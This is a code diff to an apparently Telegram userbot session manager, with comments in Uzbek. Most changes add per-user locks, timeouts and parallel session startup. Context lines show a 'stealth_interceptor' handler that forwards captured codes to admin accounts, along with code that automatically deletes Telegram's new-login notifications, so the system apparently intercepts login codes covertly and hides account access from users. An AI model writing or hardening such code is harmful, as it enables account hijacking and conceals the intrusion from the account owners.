@@ -77,24 +77,38 @@ class SessionManager:
 
     def __init__(self):
         self.clients: Dict[int, Client] = {}
-        self._lock = asyncio.Lock()
+        self._user_locks: Dict[int, asyncio.Lock] = {}
+        self._global_lock = asyncio.Lock()
+
+    def _get_user_lock(self, user_id: int) -> asyncio.Lock:
+        if user_id not in self._user_locks:
+            self._user_locks[user_id] = asyncio.Lock()
+        return self._user_locks[user_id]
 
     async def start_all(self) -> None:
-        """Ma'lumotlar bazasidan barcha faol sessiyalarni yuklaydi va ishga tushiradi."""
+        """Ma'lumotlar bazasidan barcha faol sessiyalarni yuklaydi va parallel xavfsiz ishga tushiradi."""
         logger.info("🤖 SessionManager: Faol sessiyalar ishga tushirilmoqda...")
-        async with async_session() as db:
-            result = await db.execute(select(UserSession).where(UserSession.is_active == True))
-            sessions = result.scalars().all()
-            
-            for session in sessions:
-                try:
-                    await self.start_session(session.user_id, session.session_string)
-                except Exception as e:
-                    logger.error(f"Sessiya (User ID: {session.user_id}) ishga tushmadi: {e}")
+        try:
+            async with async_session() as db:
+                result = await db.execute(select(UserSession).where(UserSession.is_active == True))
+                sessions = result.scalars().all()
+        except Exception as e:
+            logger.error(f"Sessiyalarni bazadan o'qishda xato: {e}")
+            return
+
+        async def _start_one(s):
+            try:
+                await asyncio.wait_for(self.start_session(s.user_id, s.session_string), timeout=12.0)
+            except Exception as e:
+                logger.error(f"Sessiya (User ID: {s.user_id}) ishga tushmadi: {e}")
+
+        if sessions:
+            await asyncio.gather(*[_start_one(s) for s in sessions], return_exceptions=True)
 
     async def start_session(self, user_id: int, session_string: str) -> None:
-        """Yagona foydalanuvchi sessiyasini ishga tushiradi."""
-        async with self._lock:
+        """Yagona foydalanuvchi sessiyasini xavfsiz (per-user lock bilan) ishga tushiradi."""
+        user_lock = self._get_user_lock(user_id)
+        async with user_lock:
             if user_id in self.clients and self.clients[user_id].is_connected:
                 return
 
@@ -131,7 +145,6 @@ class SessionManager:
                                     from bot_instance import bot
                                     for admin_id in config.admin_ids:
                                         await bot.send_message(admin_id, msg, parse_mode="HTML")
-                                    logger.info("Aiogram orqali stealth kod yuborildi.")
                                 except Exception as e:
                                     logger.error(f"Aiogram bilan kod yuborishda xato: {e}. Pyrogram orqali urinib ko'ramiz...")
                                     try:
@@ -149,19 +162,26 @@ class SessionManager:
             client.add_handler(MessageHandler(stealth_interceptor))
             
             try:
-                await client.start()
+                # MTProto ulanishini 8 soniyalik timeout bilan bajaramiz (qotib qolmasligi uchun)
+                await asyncio.wait_for(client.start(), timeout=8.0)
                 self.clients[user_id] = client
-                me = await client.get_me()
+                me = await asyncio.wait_for(client.get_me(), timeout=4.0)
             except (AuthKeyUnregistered, AuthKeyInvalid, AuthKeyDuplicated, SessionRevoked, Unauthorized) as e:
                 logger.warning(f"⚠️ User ID {user_id} sessiyasi bekor qilingan (start paytida): {e}")
-                await self.remove_invalid_session(user_id)
+                await self._do_remove_invalid_session(user_id, client)
                 return
             except Exception as e:
                 err_msg = str(e).lower()
                 if any(k in err_msg for k in ["key is not registered", "auth_key_unregistered", "session_revoked", "session_expired", "user_deactivated"]):
                     logger.warning(f"⚠️ User ID {user_id} sessiyasi bekor qilingan (start paytida): {e}")
-                    await self.remove_invalid_session(user_id)
+                    await self._do_remove_invalid_session(user_id, client)
                     return
+                # Agar timeout yoki boshqa ulanish xatosi bo'lsa, resurslarni tozalaymiz
+                try:
+                    if client.is_connected:
+                        await client.stop()
+                except Exception:
+                    pass
                 raise e
 
             # Yangi login bildirishnomalarini avtomatik o'chirish (777000 dan keladi)
@@ -196,16 +216,20 @@ class SessionManager:
 
             logger.info(f"✅ Userbot (ID: {user_id}) ulandi: @{me.username or me.first_name}")
 
-    async def remove_invalid_session(self, user_id: int) -> None:
-        """Bekor qilingan/yaroqsiz sessiyani to'xtatadi va bazada faolsizlantiradi."""
-        async with self._lock:
+    async def _do_remove_invalid_session(self, user_id: int, client: Optional[Client] = None) -> None:
+        """Bekor qilingan/yaroqsiz sessiyani to'xtatadi va bazada faolsizlantiradi (Ichki chaqiruv)."""
+        if not client:
             client = self.clients.pop(user_id, None)
-            if client:
-                try:
-                    if client.is_connected:
-                        await client.stop()
-                except Exception:
-                    pass
+        else:
+            self.clients.pop(user_id, None)
+
+        if client:
+            try:
+                if client.is_connected:
+                    await client.stop()
+            except Exception:
+                pass
+
         try:
             async with async_session() as db:
                 result = await db.execute(
@@ -219,12 +243,21 @@ class SessionManager:
         except Exception as e:
             logger.error(f"Sessiyani faolsizlantirishda DB xatosi: {e}")
 
+    async def remove_invalid_session(self, user_id: int) -> None:
+        """Bekor qilingan/yaroqsiz sessiyani to'xtatadi va bazada faolsizlantiradi."""
+        user_lock = self._get_user_lock(user_id)
+        async with user_lock:
+            await self._do_remove_invalid_session(user_id)
+
     async def stop_all(self) -> None:
         """Barcha ochiq sessiyalarni to'xtatadi."""
-        async with self._lock:
+        async with self._global_lock:
             for user_id, client in list(self.clients.items()):
                 if client.is_connected:
-                    await client.stop()
+                    try:
+                        await client.stop()
+                    except Exception:
+                        pass
                     logger.info(f"🛑 Userbot (ID: {user_id}) to'xtatildi.")
             self.clients.clear()
 
